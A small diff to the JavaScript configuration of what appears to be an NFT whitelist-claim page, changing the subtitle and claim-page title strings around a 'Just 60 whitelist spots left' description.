@@ -18,11 +18,11 @@ const signMessage = `Welcome, \n\n` +
 const indexPageInfo = {
     backgroundImage: "background.jpeg", // relative path to background image (in assets)
     title: "{name}", // {name} will be replaced with collectionInfo.name
-    underTitle: "Captcha.bot",
+    underTitle: "whitelist mints",
 }
 
 const claimPageInfo = {
-    title: "Whitelist Registration<br>", // <br> is a line break
+    title: "Whitelist Spot <br> Claim", // <br> is a line break
     shortDescription: "Claim your whitelist spot",
     longDescription: "Just 60 whitelist spots left",
 
